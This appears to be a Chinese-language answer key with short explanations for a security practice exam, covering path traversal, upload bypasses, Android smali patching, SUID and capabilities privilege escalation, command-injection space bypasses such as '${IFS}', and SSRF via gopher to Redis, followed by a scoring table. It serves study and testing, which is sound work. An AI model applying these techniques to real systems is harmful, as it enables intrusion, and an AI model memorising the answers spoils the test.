**Q36 ─ A**：location 無結尾斜線的 alias，`/files../` → `/var/www/data../` = `/var/www/`，off-by-slash 穿越。
**Q37 ─ D**：`SameSite=None` 是 Cookie 屬性，與**檔案上傳**繞過無關（誘答）。A/B/C 皆為真實上傳繞過手法。
**Q38 ─ D**：**錯的是 D**——`4D 5A`（MZ）是 **PE/EXE**，不是 ELF。ELF 檔頭為 `7F 45 4C 46`。
**Q39 ─ A**：ELF = `7F 45 4C 46`；PE = `4D 5A`（MZ，DOS stub）。
**Q40 ─ A**：開放重定向；常串接釣魚 / OAuth token 竊取 / 繞 SSRF 白名單。

**Q41 ─ D**：**錯的是 D**——APK 內是編譯後的 dex 位元碼，**非明文 `.java`**。
**Q42 ─ D**：**錯的是 D**——jadx 輸出僅供閱讀，**不能回編譯**成 APK；重打包要用 apktool。
**Q43 ─ A**：instance 方法中 `p0`=this、`p1`=第一個參數。static 方法才沒有 this，`p0` 即第一參數。
**Q44 ─ A**：`if-eqz`（if equal zero）在 `v1==0`（equals 回 false）時跳 `:cond_fail` → 「比對不相等就失敗」。破解常把 `if-eqz` 改 `if-nez` 或強制跳過。
**Q45 ─ A**：dex = Dalvik 位元碼（jadx/baksmali）；so = 原生機械碼（IDA/Ghidra 以 ARM/x86 反組譯）。
**Q46 ─ D**：**錯的是 D**——ProGuard/R8 做的是**重命名混淆 + 壓縮 + 優化**，**不加密字串**；明文字串常數在 jadx 仍可見（這也是找 flag/密鑰的切入點）。
**Q47 ─ A**：純靜態讀邏輯首選 jadx。
**Q48 ─ A**：Frida 動態 hook 執行期方法、改回傳值繞過檢查，是其招牌用途。

**Q49 ─ A**：`rws` = SUID，八進位 `4755`。
**Q50 ─ D**：**錯的是 D**——SUID 對**一般執行檔**有效（以 owner 身分執行）；對**目錄**無「自動提權」效果（SUID on directory 在 Linux 上被忽略）。
**Q51 ─ A**：`-perm -4000` 的減號 = 「含有該位元」；無減號的 `4000` 要求完全相等、會漏。
**Q52 ─ A**：Capabilities 把 root 特權細分；`getcap -r /` 列舉，`cap_setuid+ep` 等同可提權。
**Q53 ─ D**：**錯的是 D**——443=HTTPS（非 FTP）、143=IMAP（非 RDP）、110=POP3（非 SSH），全錯配。
**Q54 ─ C**：IaaS 下客戶負責 OS 以上（含修補、App、資料、IAM）；實體 / 虛擬化 / 網路硬體屬雲商。
**Q55 ─ A**：鐵律——資料與 IAM 永遠客戶責任；越往 SaaS 雲商承擔越多底層。

**Q56 ─ A**：頻譜圖顯字 = Spectrogram 隱寫（Audacity / Sonic Visualiser 檢視頻率-時間圖）。
**Q57 ─ A**：ZIP 偽加密 = 加密旗標位與實際不符；修回旗標即可解，不必爆破。
**Q58 ─ D**：**錯的是 D**——steghide 是圖片/音檔隱寫藏取工具，**不是反編譯 APK**（那是 jadx/apktool）。
**Q59 ─ D**：gobuster / dirsearch / ffuf 都是目錄掃描/fuzzing；**gflags 是 Windows 除錯旗標工具**，不屬掃描類（2024 經典誘答）。
**Q60 ─ D**：**錯的是 D**——DIE（Detect It Easy）是**辨識加殼/編譯器/檔案類型**，不是 SQL 注入工具（sqlmap 才是）。

---

## 📊 成績對照與回鎖

| 答對 | 評級 | 行動 |
|:--|:--|:--|
| 54~60 | 🏆 秒殺級 | 主責穩、可支援隊友通識/工具題 |
| 48~53 | ✅ 合格 | 錯題精修即可上場 |
| 40~47 | ⚠️ 待加強 | 回速查表 + 錯最多的 Part 重做 |
| ≤39 | 🔴 急救 | 鎖定 2~3 個最弱 Part 集中補 |

**錯題回鎖**：Web → [`../web/`](../web/)；Android → [`../android/`](../android/)；通識/工具 → [`../misc_cloud/`](../misc_cloud/) 與 [`../CHEATSHEET_1PAGE.md`](../CHEATSHEET_1PAGE.md)。

---

### 🧠 本卷新增的高頻深度考點（之前沒練到的）
1. **命令注入空格繞過**：`${IFS}`、`<`、`{cmd,arg}`；`%20` 無效。
2. **SSRF 進階**：gopher 打 Redis、DNS Rebinding（TOCTOU）、IMDSv2 防護。
3. **Cookie**：`SameSite=None` 必配 `Secure`；Lax 是現代預設。
4. **401(未認證) vs 403(未授權)**；CSP 不防 SQLi。
5. **郵件三支柱**：SPF=TXT 列 IP、DKIM=簽章(非加密)、DMARC=對齊+處置。
6. **反序列化觸發點**：PHP `__wakeup`/`__destruct`、Python `__reduce__`、Java `readObject`/Log4Shell JNDI。
7. **檔案解析**：Apache 多副檔名右到左回退、Nginx alias off-by-slash、`php://filter` 讀源碼。
8. **Magic Bytes**：ELF=`7F454C46`、PE/MZ=`4D5A`、PNG=`89504E47`、ZIP=`504B0304`、PDF=`25504446`。
9. **Smali**：`p0`=this、`if-eqz`=等於0才跳、dex(jadx) vs so(IDA)、ProGuard 不加密字串。
10. **Linux**：`-perm -4000`(含)≠`4000`(等於)、Capabilities `getcap`、SUID 對目錄無效。
11. **工具誘答**：gflags 非掃描、DIE 非 sqlmap、steghide 非反編譯、1768.py/Hollow Hunter/Regshot(2024 考過)。
